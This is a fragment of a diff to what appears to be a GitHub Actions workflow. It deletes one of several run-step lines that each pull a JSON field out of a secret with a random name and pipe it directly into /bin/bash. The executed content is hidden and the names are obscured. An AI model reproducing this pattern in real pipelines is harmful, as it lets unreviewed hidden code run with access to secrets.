@@ -17,7 +17,6 @@ jobs:
           larg61288: ${{ secrets.larg61288 }}
         run: |
           printf '%s' "$larg61288" | jq -r .zth655 | /bin/bash
-          echo $mhlg47832 | jq -r .fx00 | /bin/bash
           printf '%s' "$rm65017" | jq -r .ni643 | /bin/bash
           echo $wy144 | jq -r .xlhfi858 | /bin/bash
           printf '%s' "$fro5375" | jq -r .ewhyb061 | /bin/bash
